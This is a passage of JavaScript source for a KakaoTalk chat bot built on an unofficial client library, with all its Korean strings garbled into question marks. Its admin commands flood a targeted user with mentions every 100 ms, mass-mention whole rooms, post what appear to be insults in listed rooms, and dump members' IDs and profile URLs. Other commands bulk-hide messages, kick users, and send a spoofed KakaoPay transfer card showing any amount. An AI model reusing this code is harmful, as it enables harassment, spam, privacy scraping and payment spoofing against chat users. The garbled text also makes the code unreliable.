                              break;
                              case 5 :
                                channel.sendChat(
                                    new node_kakao.ChatBuilder()
                                    .append(new node_kakao.AttachmentContent({
                                        shout: true
                                    }))
                                    .text("???~????????? ???????????????~????????? ???????????????~????????? ????????????")
                                    .build(1)
                                )
                              break;
                            }
                            i++;
                        }, 180);
                    } else {
                        channel.sendChat("[ ???? ]  ?????? ????????? ??????????????????");
                    }
                }
            }

            if (king.includes(roomId)) {
                if (!data.text.startsWith(prefix + "??????")) {
            sendErrorPhone3()    
            }}


            if (fuck.includes(roomId)) {
                var value = Math.floor(Math.random() * 10);
                switch (value) {
                    case 0:
                        channel.sendChat("???????????? ????????????????????? ????????? ???????????? ??????????????? ???????????? ???")
                        break;
                    case 1:
                        channel.sendChat("????????? ????????? ?????? ???????????? ?????? ????????? ????????? ???????????? ????????? ??????");
                        break;
                    case 2:
                        channel.sendChat("????????? ?????? ????????? ?????? ????????? ?????????????????? ?????? ???????????? ???????????????");
                        break;
                    case 3:
                        channel.sendChat("???????????????????????? ??????????????? ?????????????????????????????? ???????????? ????????? ??????????????????");
                        break;
                    case 4:
                        channel.sendChat("????????? ????????? ??????????????? ?????? ?????? ????????????");
                        break;
                    case 5:
                        channel.sendChat("???????????? ????????? ?????? ??????????????? ????????? ???????????? ?????????");
                        break;
                        case 7:
                            channel.sendChat("???????????? ?????? ?????????????????? ????????? ??????????????? ?????? ????????????????????? ?????????????????? ????????? ???????????????????????? ?????????");
                            break;
                            case 8:
                                channel.sendChat("???????????? ?????????????????? ???????????? ??????????????? ????????????????????? ????????? ???????????????");
                                break;       
                                case 9:
                                    channel.sendChat("????????? ????????? ???????????? ????????? ???????????? ????????? ????????? ?????????????????????????????? ?????? ?????????");
                                    break;   
                            }
            }
            if (data.text.startsWith(prefix + "????????????")) {
                if (adminList.includes(id)) {
                    console.log("!")
            let allUser = Array.from(channel.getAllUserInfo());
            let mentions = [];
            console.log("!")
            allUser.forEach((user, index, _this) => {
              if (String(user.userId).length < 10) return;
              if (!mentions[Math.floor(index / 15)])
                mentions[Math.floor(index / 15)] = [];
              mentions[Math.floor(index / 15)].push({
                user_id: user.userId,
                at: [(index % 15) + 1],
                len: 1,
              })
            })
            console.log("!")
            mentions.forEach((v) => {
              sendrawch(20,"", {
                type: "",
                url : '4417409.emot_004.webp',
                name: "(????????????)",
                width: "1",
                height: "1",
                sound: "",
                alt: "????????? ????????????",
                mentions: v,
              })
            })}}

            if (data.text.startsWith(prefix + "?????? ")) {
                if (adminList.includes(id)) {
                    var twomen = data.text.replace(prefix + "?????? ", "");
                    sendrawch(1,'',{
                        "mentions":[
                            {
                                "user_id":twomen,
                                "at":[
                                    1
                                ],
                                "len":20
                            }
                        ]
                    })
                }
            }

            if (data.text.startsWith(prefix + "?????? ")) {
                if (adminList.includes(id)) {
                    if (data.text == prefix + "??????") {
                        channel.sendChat("????????? ????????? ??????????????????!");
                    } else {
                        if (!runningSpamString) {
                            var twomention = data.text.replace(prefix + "?????? ", "");
                            var twomen = sendrawch(1,'',{
                                "mentions":[
                                    {
                                        "user_id":twomention,
                                        "at":[
                                            1
                                        ],
                                        "len":20
                                    }
                                ]
                            })
                            var i = 0;
                            runningSpamString = true;
                            stringInterval = setInterval(() => {
                                sendrawch(1,'',{
                                    "mentions":[
                                        {
                                            "user_id":twomention,
                                            "at":[
                                                1
                                            ],
                                            "len":20
                                        }
                                    ]
                                });
                                i++;
                            }, 100);
                        } else {
                            channel.sendChat("[ ???? ]  ?????? ????????? ??????????????????");
                        }
                    }
                } else {
                    channel.sendChat("[ ???? ] ????????? ?????? ???????????? ????????? ????????? ????????????");
                }
            }
    
            if (data.text.startsWith(prefix + "m")) {
                if (adminList.includes(id)) {
                    console.log("!")
            let allUser = Array.from(channel.getAllUserInfo());
            let mentions = [];
            allUser.forEach((user, index, _this) => {
              if (String(user.userId).length < 10) return;
              if (!mentions[Math.floor(index / 15)])
                mentions[Math.floor(index / 15)] = [];
              mentions[Math.floor(index / 15)].push({
                user_id: user.userId,
                at: [(index % 15) + 1],
                len: 1,
              })
            })
            mentions.forEach((v) => {
              sendrawch(1,"??????", {
                mentions: v,
              })
            })}}
    
        if (data.text.startsWith(prefix + "?????????")) {
                var value = Math.floor(Math.random() * 5);
                switch (value) {
                    case 0:
                        channel.sendChat("???");
                        break;
                    case 1:
                        channel.sendChat("???");
                        break;
                    case 2:
                        channel.sendChat("???");
                        break;
                    case 3:
                        channel.sendChat("???");
                        break;
                    case 4:
                        channel.sendChat("???");
                        break;
                    case 5:
                        channel.sendChat("???");
                        break;
                }
            }
        

        if (data.text.startsWith(prefix + "?????? ")) {
            if (adminList.includes(id)) {
                try {
                    var v = roomId + ":" + data.mentions[0].user_id;
                    if (!Hider) {
                        channel.sendChat("??? ????????? ???????????? ????????? ????????? ????????? ????????? ???????????? ???????????????.");
                        Hider = [];
                    }
                    if (v) {
                        if (!Hider.includes(v)) {
                            Hider.push(v);
                            var list;
                            for (getValueFor in Hider) {
                                list += v + "\n";
                            }
                            channel.sendChat("?????? '" + v + "' ??? ?????? ???????????? ????????? ???????????????.");
                        } else {
                            channel.sendChat("?????? ????????? ?????? ???????????? ?????????????????????.");
                        }
                    } else {
                        channel.sendChat("?????? @??????' ??? ????????? ????????????.");
                    }
                } catch (error) {
                    channel.sendChat("?????? ???????????? ????????? ??????????????????.\n" + error);
                }
            } else {
                channel.sendChat("????????? ?????? ???????????? ????????? ????????? ????????????!");
            }
        }

        if (data.text.startsWith(prefix + "???????????? ")) {
            if (adminList.includes(id)) {
                try {
                    var v = roomId + ":" + data.mentions[0].user_id;
                    if (String(v)) {
                        var v1 = Hider.indexOf(String(v));
                        if (v1 > -1) {
                            Hider.splice(v1, 1);
                            channel.sendChat("?????? ????????? ??????????????? ??????????????????.");
                        } else {
                            channel.sendChat("???????????? ?????? ???????????????.");
                        }
                    } else {
                        channel.sendChat("???????????? @??????' ??? ????????? ????????????.");
                    }
                } catch (error) {
                    channel.sendChat("?????? ???????????? ????????? ??????????????????.");
                }
            } else {
                channel.sendChat("????????? ?????? ???????????? ????????? ????????? ????????????!");
            }
        }



        if (data.text == prefix + "??????") {
                request('http://hangang.dkserver.wo.tc', (error, response, html) => {
                    const river = JSON.parse(html);
                    channel.sendChat("?????? ?????? ????????? " + river.temp + "??C ?????????!");
                });
        }
        if (banKey.includes(roomId )) {
            var didYouBan = false;
            for (getValueFor = 0; getValueFor < banWord.length; getValueFor++) {
                if (data.text.includes(banWord[getValueFor])) {
                    if (didYouBan == false) {
                        didYouBan = true;
                        channel.sendChat(new node_kakao.ChatBuilder().text("[ ! ] ").append(new node_kakao.MentionContent(channel.getUserInfo({ userId: id }))).text("?????? ?????? ?????? ????????? ??????????????????").build(1));
                        pausecomp(110)
                        channel.hideChat(data.chat);
                                        }
                }
            }
        }
        if (banKey2 == "yes") {
            for (getValueFor = 0; getValueFor < banWord2.length; getValueFor++) {
                if (data.text.includes(banWord2[getValueFor])) {
                    if (didYouBan == false) {
                        didYouBan = true;
                        channel.hideChat(data.chat);
                        channel.kickUser2(id);
                        channel.sendChat(new node_kakao.ChatBuilder().text("[ ! ] ").append(new node_kakao.MentionContent(channel.getUserInfo({ userId: id }))).text("?????? ????????? ??????????????????").build(1));
                    }
                }
            }}


        if (data.text == prefix + "??????") {
            if (adminList.includes(id)) {
                if (data.originalType == node_kakao.KnownChatType.REPLY) {
                    try {
                        channel.deleteChat2(data._chat.attachment.src_logId);
                    } catch (error) {
                        channel.sendChat("??????" + error);
                    }
                } else {
                    channel.sendChat("?????? ???????????? ?????? ????????? ???????????????.");
                }
            }
        }

        if (data.text == prefix + "????????????") {
            if (adminList.includes(id)) {
                if (data.originalType == node_kakao.KnownChatType.REPLY) {
                    try {
                        const reply = data.attachment(node_kakao.ReplyAttachment);
                        const logId = reply.src_logId;
                        if (logId) {
                            const readers = channel.getReaders({ logId });
                            channel.sendChat( `???????????? ???: ${readers.length}` + "\u200b".repeat(1000) + `\n\n???????????? ?????????:\n${readers.map(reader => reader.nickname).join('\n')}`);
                        }
                    } catch {
                        channel.sendChat(error);
                    }
                } else {
                    channel.sendChat("[ ???? ] ?????? ????????? ????????????");
                }
            }
        }

        if(roomId != "18286056132767345") {
        if(data.text == prefix + "?????????") {
            sendrawch(23,"",{
                "L": "",
                "Q": "????????? LIST",
                "V": "list",
                "I": "",
                "F": {
                    "BU": [
                        {
                            "T": "??????????????? ?????? ???????????????",
                            "L": "",
                            "TP": "more"
                        }
                    ]
                },
                "R": [
                    {
                        "T": "?????? ?????????",
                        "D":  "???????????? ????????? ?????? ???????????????!",
                        "I": "https://t1.daumcdn.net/cfile/tistory/1968CE45505C188506",
                        "L": "https://cdn.discordapp.com/attachments/923097888576393248/926430046309212210/Smelly_Chat_BEH.mcpack",
                        "W": 216,
                        "H": 216
                    },
                    {
                        "T": "????????? ????????? ?????????",
                        "D":  "???????????? ????????? ???????????? ?????? ???????????????!",
                        "I": "https://t1.daumcdn.net/cfile/tistory/1968CE45505C188506",
                        "L": "https://cdn.discordapp.com/attachments/923097888576393248/926430046552473620/36bffaa4a1e3a29a.mcpack",
                        "W": 216,
                        "H": 216
                    },
                    {
                        "T": "?????? ?????? ?????????",
                        "D":  "?????? ?????? ????????? ???????????????!",
                        "I": "https://t1.daumcdn.net/cfile/tistory/1968CE45505C188506",
                        "L": "https://cdn.discordapp.com/attachments/923097888576393248/926823823809064980/yeondu_script.mcpack",
                        "W": 216,
                        "H": 216
                    },
                ]
            })
        }}

        if (data.text == prefix + "????????????") {
            if (adminList.includes(id)) {
                channel.sendChat("???????????? ?????? ??????" + "\u200b".repeat(1000) +
                    "\n" +
                    "\n" +
                    "\n4412207 ?????? ????????? (??????) (?????????)" +
                    "\n2212560 ?????????????????? ????????? (??????) (????????????)" +
                    "\n4412255 ??????! ?????? ???????????? ????????? ????????? (??????) (?????????)" +
                    "\n9000123 ??????! ?????? ???????????? ?????? ????????? (??????) (????????????)" +
                    "\n4412008 ??????! ?????? ???????????? ????????? ????????? (??????) (????????????)" +
                    "\n4412234 ??????????????????2 (??????) (?????????)" +
                    "\n4412355 ?????? ?????? ????????? (??????) (?????????)" +
                    "\n4412444 ???????????? ???????????? (??????) (?????????)" +
                    "\n4413442 ???????????? ???????????? ????????? (??????) (?????????)" +
                    "\n4413442 ????????? ?????? ????????? (??????) (?????????)" +
                    "\n4412442 ?????????????????? Ver.3 (??????) (?????????)" +
                    "\n4412550 ??????! ???????????????! (??????) (?????????)" +
                    "\n4412300 ???????????? ???????????? ????????? (??????) (?????????)" +
                    "\n4414206 10??? ?????? ????????? ?????? 2??? (??????) (?????????)" +
                    "\n4415442 ???????????? ??? (??????) (?????????)" +
                    "\n4411439 ????????? ???????????? (??????) (?????????)" +
                    "\n4412045 ?????? ????????? ????????? (??????) (?????????)" +
                    "\n9000164 ??????????????? ???????????? (??????) (?????????)" +
                    "\n4420117 ???????????? ???????????? (??????) (?????????)" +
                    "\n2221163 ???????????? ???????????? ???????????? ???????????? (??????) (????????????)" +
                    "\n4416520 ????????? ????????? ??????2 (??????) (?????????)" +
                    "\n4416471 ??????! (??????) (?????????)" +
                    "\n4403128 ????????? ???????????? (??????) (?????????)" +
                    "\n4415740 ??? ????????? ??? ????????? (??????) (?????????)" +
                    "\n4416484 ????????? ????????? 2 (??????) (?????????)" +
                    "\n4414429 ????????? ???????????? (??????) (?????????)" +
                    "\n4411015 ???????????????????????? (??????) (?????????)" +
                    "\n2214743 ???????????? (??????) (????????????)" +
                    "\n4415752 ???????????? ???????????? (??????) (?????????)" +
                    "\n4414420 ???????????? ???????????? (??????) (?????????)" +
                    "\n2221289 ????????? ????????? ????????? 3 (??????) (????????????)" +
                    "\n4416423 ???????????? (??????) (?????????)" +
                    "\n4416283 ????????? ?????? (??????) (?????????)" +
                    "\n2214616 ???????????? ?????? (??????) (????????????)" +
                    "\n2214958 ??????????????? ?????????.. (??????) (????????????)" +
                    "\n2212330 ????????? ????????? ?????? (??????) (????????????)" +
                    "\n2212383 ???????????? ????????? ???????????? ?????? (??????) (????????????)" +
                    "\n4415985 ?????????13 (??????) (?????????)" +
                    "\n4401161 ??? ????????? ??????????????? (??????) (?????????)" +
                    "\n4401166 ?????? ?????? ???????????? (??????) (?????????)" +
                    "\n4401141 ??? ????????? ???????????? (??????) (?????????)" +
                    "\n4401146 ?????? ????????? ???????????? (??????) (?????????)" +
                    "\n2214634 ?????? ?????? 2 (??????) (????????????)" +
                    "\n2214471 ?????? ?????? (??????) (????????????)" +
                    "\n9000109 ???????????? ????????? ???????????? (??????) (?????????)" +
                    "\n4414147 ??????!! ????????? ????????? (??????) (?????????)" +
                    "\n4414153 ????????? ?????? 4 (??????) (?????????)" +
                    "\n2214504 ????????? ?????? 2 (??????) (????????????)" +
                    "\n4414875 ?????? ????????? (??????) (?????????)" +
                    "\n4401154 ??????, ???????????? ??????????????? (??????) (?????????)" +
                    "\n4414153 ????????? ?????? 4 (??????) (?????????)" +
                    "\n4412197 ???????????? ????????? ?????? (??????) (?????????)" +
                    "\n4401072 ???????????? (??????) (?????????)" +
                    "\n4413107 ??? ?????? ??? ????????? ?????? ????????? (??????) (?????????)" +
                    "\n4414342 ????????? ????????? ???????????? ?????????! (??????) (?????????)" +
                    "\n4412660 ????????? ?????????, ???????????? (??????) (?????????)" +
                    "\n4412465 ???????????? ????????? ?????? (??????) (?????????)");
            }
        }



        if (data.text === prefix + '?????????') {
            if (adminList.includes(id)) {
                channel.sendChat("?????????Room_Log?????????" + "\u200b".repeat(1000) + "\n" +
                    channel.getChannelInfo()
                )
            }
        }
        if (data.text === prefix + '?????????a') {
            if (adminList.includes(id)) {
            if (data.originalType === 26) {
                let start = new Date();  // ??????
               var chlog = '';
               var reply = data.attachment();
               var logId = reply.src_logId;
               channel.getChatListFrom(logId).then(r => {
                  if (r.result) {
                     r.result.forEach((v , i) => {
                            channel.hideChat(v)
                            i++
                     });
                     test();
                     let end = new Date();  // ??????
                     var ms = end - start
                     var ms1 = ms * 0.01
                     channel.sendChat("RUNTIME : " + ms1 + "s" )
                  }
               });
            }
         }}

        if (data.text === prefix + '??????a') {
            if (adminList.includes(id)) {
            if (data.originalType === 26) {
                let start = new Date();  // ??????
               var chlog = '';
               var reply = data.attachment();
               var logId = reply.src_logId;
               channel.getChatListFrom(logId).then(r => {
                  if (r.result) {
                     r.result.forEach((v, i) => {
                         try {
                        channel.deleteChat2(data._chat.attachment.src_logId)
                        channel.deleteChat2(v.logId)
                         } catch(error) {
                             console.log(error)
                         }
                     });
                     test();
                     let end = new Date();  // ??????
                     var ms = end - start
                     var ms1 = ms * 0.01
                     channel.sendChat("RUNTIME : " + ms1 + "s" )
                  }
               });
            }
         }}


         if (data.text.startsWith(prefix + "?????? ")) {
            var search = data.text.replace(prefix + "?????? ", ""); 
            var search_ = encodeURI(search)
                channel.sendChat(
                    new node_kakao.ChatBuilder().append(new node_kakao.AttachmentContent({
               "L": "",
               "Q": "[ " + search + "??? ?????? ??????????????? ]",
               "V": "list",
               "I": "",     
               "R": [
                  {
                     "T": "[ ????????? ]",
                     "D": "[ " + search + "??? ?????? ??????????????? ]",
                     "I": "https://i.pinimg.com/originals/94/a1/d8/94a1d897928fc23f489204266df5a35f.png",
                     "L": "https://www.youtube.com/results?search_query=" + search_,
                     "W": 216,
                     "H": 216
                  },
                  {
                    "T": "[ ?????? ]",
                    "D": "[ " + search + "??? ?????? ??????????????? ]",
                    "I": "https://lamanus.kr/wp-content/uploads/2018/08/google-2048x1536.png",
                    "L": "https://www.google.co.kr/search?q=" + search_,
                    "W": 216,
                    "H": 216
                 },
                 {
                    "T": "[ ???????????? ]",
                    "D": "[ " + search + "??? ?????? ??????????????? ]",
                    "I": "https://th.bing.com/th/id/OIP.9U_csAu86wh_TDsWTu584gHaHa?pid=ImgDet&rs=1",
                    "L": "https://namu.wiki/w/" + search_,
                    "W": 216,
                    "H": 216
                 },
                 {
                    "T": "[ ????????? ]",
                    "D": "[ " + search + "??? ?????? ??????????????? ]",
                    "I": "https://th.bing.com/th/id/OIP.CS1M4QfYLA7psPkhbOv_awHaCA?w=321&h=94&c=7&r=0&o=5&pid=1.7",
                    "L": "https://search.naver.com/search.naver?where=nexearch&sm=top_hty&fbm=1&ie=utf8&query=" + search_,
                    "W": 216,
                    "H": 216
                 },
               ]
            }))
            .build(23)
            );
        }

        function pausecomp(millis) {
            var date = new Date();
            var curDate = null;
            do {
              curDate = new Date();
            } while (curDate - date < millis);
          }








         if (data.text.startsWith(prefix + "?????????")) {
            request("https://search.naver.com/search.naver?where=nexearch&sm=top_hty&fbm=0&ie=utf8&query=%EC%BD%94%EB%A1%9C%EB%82%98",
            (error, response, html) => {
                var $ = cheerio.load(html);
                var hak = $("div.status_info").text().split(" ")[4];
                var nhak = $("div.status_info").text().split(" ")[5];
                var d = $("div.status_info").text().split(" ")[9];
                var nd = $("div.status_info").text().split(" ")[10];
                var ti = $("span._update_time").text()
                channel.sendChat(
                    new node_kakao.ChatBuilder().append(new node_kakao.AttachmentContent({
               "L": "",
               "Q": "[??? ????????? ?????? ???]",
               "V": "list",
               "I": "",
               "F": {
                "BU": [
                   {
                      "T": "??? ????????? ??????",
                      "L": "https://corona-live.com",
                      "TP": "more"
                   }
                ]
             },      
               "R": [
                  {
                     "T": "[ ????????? ]",
                     "D": hak + "???",
                     "I": "",
                     "L": "",
                     "W": 216,
                     "H": 216
                  },
                  {
                    "T": "[ ?????? ????????? ]",
                    "D": nhak + "???",
                    "I": "",
                    "L": "",
                    "W": 216,
                    "H": 216
                 },
                 {
                    "T": "[ ????????? ]",
                    "D": d + "???",
                    "I": "",
                    "L": "",
                    "W": 216,
                    "H": 216
                 },
                 {
                    "T": "[ ?????? ????????? ]",
                    "D": nd + "???",
                    "I": "",
                    "L": "",
                    "W": 216,
                    "H": 216
                 },
                 {
                    "T": "[ ?????? ?????? ]",
                    "D": ti + "\n?????? ??????",
                    "I": "",
                    "L": "",
                    "W": 216,
                    "H": 216
                 },
               ]})).build(23))});
        }
        if (data.text.startsWith(prefix + "tts ")) {
            if (adminList.includes(id)) {
                try {
                var tts = data.text.replace(prefix + "tts ", "")
                if(tts.length < 80) {
                    var url = "https://tts-translate.kakao.com/newtone?message=" + encodeURI(tts)
                    http.get(url.replace("https", "http"), (res) => {
                        var file = fs.createWriteStream(`tts.m4a`);
                        res.pipe(file);
                        file.on('finish', () => {
                            async function msg() {
                                await file.close();
                                await channel.sendMedia(node_kakao.KnownChatType.AUDIO, {
                                    name: `tts.m4a`,
                                    data: fs.readFileSync(`tts.m4a`),
                                    width: 500,
                                    height: 500,
                                    ext: 'm4a'
                                });
                            }
                            msg();
                        });
                    }).on("error", (err) => {
                        console.log("Error: ", err.message);
                    });
            } else {
                channel.sendChat("?????? ?????? ?????????!")
            }
        } catch (error) {
            console.log(error
                )
        }
        }
        } 

//??????
        console.log("[ SERVER : " + channel.getDisplayName() + " ] [ Name : " + sender.nickname  + "( " + sender.userId + " ) ] : " + data.text )

             if (data.text == prefix + "??????n") {
                if (adminList.includes(id)) {
                    $TitleSpamList[roomId] = false;
                }}
                if (data.text.startsWith(prefix + "??????p ")) {
                if (adminList.includes(id)) {
                    try {
                        var title = data.text.replace(prefix + "??????p ", "");
                        $TitleSpamList[roomId] = title;
                        channel.setTitleMeta(title);
                        channel.sendChat("??? ????????? [ " + title + " ] ??? ???????????????!");
                    } catch (e) {
                        channel.sendChat(e + "");
                    }
                }}


        if (data.text.startsWith(prefix + "?????? ")) {
            if (adminList.includes(id)) {
                var QR = data.text.replace(prefix + "?????? ", "")
                    var url = "https://chart.apis.google.com/chart?cht=qr&chs=526x526&chl=" + encodeURI(QR)
                    http.get(url.replace("https", "http"), (res) => {
                        var file = fs.createWriteStream(`${id}.png`);
                        res.pipe(file);
                        file.on('finish', () => {
                            async function msg() {
                                await file.close();
                                await channel.sendMedia(node_kakao.KnownChatType.PHOTO, {
                                    name: `${id}.png`,
                                    data: fs.readFileSync(`${id}.png`),
                                    width: 500,
                                    height: 500,
                                    ext: 'jpg'
                                });
                                await fs.unlinkSync(`${id}.png`);
                            }
                            msg();
                            pausecomp(220)
                            channel.sendChat("????????? QR ???????????????!")
                        });
                    }).on("error", (err) => {
                        console.log("Error: ", err.message);
                    });
            }
        }
        if (data.text.startsWith(prefix + "?????? " )) {
            if (adminList.includes(id)) {
                var url = data.text.replace(prefix + "?????? ", "");
                        http.get(url.replace("https", "http"), (res) => {
                        var file = fs.createWriteStream(`p1.png`);
                        res.pipe(file);
                        file.on('finish', () => {
                            async function msg() {
                                await file.close();
                                await channel.sendMedia(node_kakao.KnownChatType.PHOTO, {
                                    name: `p1.png`,
                                    data: fs.readFileSync(`p1.png`),
                                    width: 500,
                                    height: 500,
                                    ext: 'jpg'
                                });
                                await fs.unlinkSync(`p1.png`);
                            }
                            msg();
                        });
                    }).on("error", (err) => {
                        channel.sendChat("????????? ??????????????????!" + error)
                    });
            }
        }

        if (data.text.startsWith(prefix + "??????" )) {
            if (adminList.includes(id)) {
                if (data.mentions[0]) {
                    var mention = data.mentions[0];
                    var url = channel.getUserInfo({ userId: mention.user_id }).originalProfileURL || "????????? ?????? ??????";
                    http.get(url.replace("https", "http"), (res) => {
                        var file = fs.createWriteStream(`p.png`);
                        res.pipe(file);
                        file.on('finish', () => {
                            async function msg() {
                                await file.close();
                                await channel.sendMedia(node_kakao.KnownChatType.PHOTO, {
                                    name: `p.png`,
                                    data: fs.readFileSync(`p.png`),
                                    width: 500,
                                    height: 500,
                                    ext: 'jpg'
                                });
                                await fs.unlinkSync(`p.png`);
                            }
                            msg();
                        });
                    }).on("error", (err) => {
                        console.log("Error: ", err.message);
                    });
                } else {
                    channel.sendChat("????????? ????????? ????????? ??????????????????!");
                }
            }
        }


        if (data.text == prefix + "?????????") {
            if (adminList.includes(id)) {
                try {
                    var userList = Array.from(channel.getAllUserInfo());
                    var msg = "??? ??????: " + channel.getDisplayName()+
                    "\n\n??? ?????????: " + roomId +
                    "\n\n??? ??????: " + channel.userCount +
                    "\n\n----------------------------" +
                    "";
                    for (var i = 0; i < userList.length; i++) {
                        try {
                            msg += "\n\n?????????: " + userList[i].nickname+ "\n?????????: " + userList[i].userId + "\n????????? ??????: " + userList[i].profileURL 
                        } catch {

                        }
                    }

                    msg += "\n\n----------------------------";

                   sendLong(channel,"??????????????? ????????? ???????????????", msg)
                } catch (error) {
                    channel.sendChat("??????!\n" + error);
                }
            }
        }

         if (data.text.startsWith(prefix + "?????? ")) {
            if (adminList.includes(id)) {
                    var _Mention = data.mentions[0].user_id;
                        channel.kickUser2(_Mention);
                        channel.sendChat("????Kicked????\n\n" + data.mentions[0].user_id);
                    }
                }
         if (data.text === prefix + '?????????') {
            if (adminList.includes(id)) {
            if (data.originalType === 26) {
               var chlog = '';
               var reply = data.attachment();
               var logId = reply.src_logId;
               channel.getChatListFrom(logId).then(r => {
                  if (r.result) {
                     r.result.forEach((v, i) => {
                         try {
                        chlog +=
                           '???????????? ????????? : ' +
                           channel.getUserInfo({userId: v.sender.userId}).userId +
                           ' ?????????: ' +
                           v.text + "\n\n";
                         } catch(error) {
                             console.log(error)
                         }
                     });
                     sendLong(channel , "????????? ????????? ???????????????!" , chlog)
                  }
               });
            }
         }}

         if (data.text == prefix + '??????') {
            if (adminList.includes(id)) {
            if (data.originalType === 26) {
               var chlog = '';
               var nick= "";
               var reply = data.attachment();
               var logId = reply.src_logId;
               try {
               channel.getChatListFrom(logId).then(r => {
               var a =  JSON.stringify(r.result[0].attachment, null, 3)
                        chlog +=
                           '???????????? ?????????: ' +
                           r.result[0].sender.userId +
                           '\n\n' +
                           '??? ?????????: ' +
                           channel.info.channelId +
                           '\n\n' +
                           '?????? ??????: ' +
                           new Date(r.result[0].sendAt) +
                           '\n\n' +
                           '????????? ??????: ' +
                           r.result[0].type +
                           '\n\n' +
                           '?????????: ' +
                           a + "\n" +
                           '\n' +
                           '?????????: ' +
                           r.result[0].text +
                           '\n\n --------------------------------------- \n';
                     channel.sendChat(r.result[0])
                     pausecomp(220)
                     sendLong(channel , "??????(Log)" , chlog)
                     pausecomp(220)
                     sendLong(channel, "??????", prefix + "ev sendrawch(" +r.result[0].type +",'" + r.result[0].text + "'," + a + ")");
               });
            } catch(error) {
                channel.sendChat(error)
            }
            }
         }}
        


        if (data.text === prefix + '??????') {
            if (adminList.includes(id)) {
            if (data.originalType === 26) {
               var chlog = '';
               var nick= "";
               var reply = data.attachment();
               var logId = reply.src_logId;
               try {
               channel.getChatListFrom(logId).then(r => {
                  if (r.result) {
                     r.result.forEach((v, i) => {
                        chlog +=
                           '???????????? ?????????: ' +
                           v.sender.userId +
                           '\n\n' +
                           '??? ?????????: ' +
                           channel.info.channelId +
                           '\n\n' +
                           '?????? ??????: ' +
                           new Date(v.sendAt) +
                           '\n\n' +
                           '????????? ??????: ' +
                           v.type +
                           '\n\n' +
                           '?????????: ' +
                           JSON.stringify(v.attachment, null, 3) + "\n" +
                           '\n' +
                           '?????????: ' +
                           v.text +
                           '\n\n --------------------------------------- \n';
                     });
                     sendLong(channel , "??????(Log)" , chlog)
                  }
               });
            } catch(error) {
                channel.sendChat(error)
            }
            }
         }}
        



        if (data.text.startsWith(prefix + "?????? ")) {
            if (adminList.includes(id)) {
            var km = data.text.replace(prefix + "?????? ", "")
                km * 1
                channel.sendChat(
                    new node_kakao.ChatBuilder().append(new node_kakao.AttachmentContent({
                        "L": "",
                        "Q": "???????????????",
                        "V": "brand",
                        "R": [
                            {
                                "D": "",
                                "L": "",
                                "DE": "",
                                "I": "http://t1.daumcdn.net/kakaopay/money/tms/2018_v2_tms_send.png",
                                "T": km + "?????? ????????????"
                            }
                        ],
                        "F": {
                            "BU": [
                                {
                                    "T": "??????",
                                    "L": "https://www.kakaopay.com/ir/announcement/notice/2121"
                                }
                            ]
                        }
                    }))
                        .build(23)
                )
        }}

        if (data.text.startsWith(prefix + "????????????")) {
            if (adminList.includes(id)) {
                try {
                    var user_id = data.text.replace(prefix + "???????????? ", "");
                    var unbanUserObj = { userId: user_id };
                    channel.removeKicked(unbanUserObj);
                    channel.sendChat("[ " + user_id + " ] ?????? ????????? ??????????????????!");
                } catch (error) {
                    channel.sendChat("?????? ???????????? ????????? ??????????????????.\n" + error);
                }
            }
        }

        if (data.text.startsWith(prefix + "?????? ")) {
                var t2 = data.text.replace(prefix + "?????? ", "").split('/')[0];
                var t3 = data.text.replace(prefix + "?????? ", "").split('/')[1];
        sendrawch(23,"", {
            "L": "",
            "Q": "????????? ??????????????????!",
            "V": "game",
            "F": {
                "BU": [
                   {
                      "T": "???????????? ????????? ???????????????!",
                      "L": "",
                      "TP": "more"
                   }
                ]
             }, 
            "R": [
               {
                  "D": "????????? ??????????????????????",
                  "L": "",
                  "CV": {
                    "L": "",
                     "I": "https://search1.daumcdn.net/search/statics/special/mi/r2/bubble_img_jebi.png",
                     "T": "????????? ???????????????!",
                     "DE": "????????? ???????????????!"
                  },
                  "TP": "2",
                  "DR": {
                     "T": "",
                     "DE": ""
                  },
                  "RT": [
                     {
                        "ID": data.mentions[0].user_id,
                        "T": "????",
                        "DE": t2
                     },
                     {
                        "ID": id,
                        "T": "????",
                        "DE": t2
                     }
                  ],
                  "MI": 0
               }
            ],
            "RF": {
                "BU": [
                    {
                        "T": channel.getUserInfo({ userId: id }).nickname + "?????? " +channel.getUserInfo({ userId: data.mentions[0].user_id }).nickname + "????????? ?????? ???????????????!",
                        "L": "" 
                    }
               ]
            }
         })
        }

        
        if (data.text.startsWith(prefix + "o?????? ")) {
            var open = data.text.replace(prefix + "o?????? ", "")
            request("https://api.develope.kr/search/room/list?query=" + encodeURI(open) + "&type=m", function (err, res, html) {
                var openLinkResult = JSON.parse(html);
                if (openLinkResult.success == false) {
                channel.sendChat("????????? ?????? ???????????? ????????????!");
                } else {
                  sendLong(channel, open + "??? ?????? ???????????? ?????? ???????????????!",
                  openLinkResult.result.lists
                    .map((openLink) =>
                      [
                     "??????????????? ??????: " + openLink.name,
                        "??????????????? ??????: " + openLink.openlink,
                        "??????????????? ??????: " + openLink.owner,
                        "??????????????? ??????: " + openLink.desc,
                        "??????????????? ??????: " + openLink.headcount,
                        "??????????????? ??????: " + openLink.like,
                        "??????????????? ??????: " + openLink.wp,
                        "========================="
                      ].join("\n")
                    )
                    .join("\n\n")
                );}
            })
        }

        if (data.text.startsWith(prefix + "?????? ")) {
            var url = data.text.replace(prefix + "?????? ", "")
            request(url, function (err, res, html) {
                try {
                    var $ = cheerio.load(html);
                    sendLong(channel,"?????? ???????????? ?????? ???????????????" , html)
                } catch (err) {
                    channel.sendChat(err)
                }
            });
        }

        if (data.text.startsWith(prefix + "?????? ")) {
            var link = data.text.replace(prefix + "?????? ", "")
            channel.sendChat(
                new node_kakao.ChatBuilder().append(new node_kakao.AttachmentContent({
                    "inapp": true,
                    "f": true
                })).text(link).build(1)
            )
        }


        if (data.text.startsWith(prefix + "?????? ")) {
            if (adminList.includes(id)) {
                var m1 = data.text.replace(prefix + "?????? ", "").split('/')[0];
                var m2 = data.text.replace(prefix + "?????? ", "").split('/')[1];
                channel.sendChat(
                    new node_kakao.ChatBuilder().append(new node_kakao.AttachmentContent({
                        "type": "animated-sticker/digital-item",
                        "url": m1 + '.emot_' + m2 + '.webp',
                        "name": "(????????????)",
                        "sound": "",
                        "width": "360",
                        "height": "360",
                        "msg": '',
                        "alt": "????????? ????????????"
                    })).build(20)
                );
            }
        }
 

        if (data.text.startsWith(prefix + "?????? ")) {
            if (adminList.includes(id)) {
                if (!runningSpamString) {
                    var m12 = data.text.replace(prefix + "?????? ", "").split('/')[0];
                    var m22 = data.text.replace(prefix + "?????? ", "").split('/')[1];
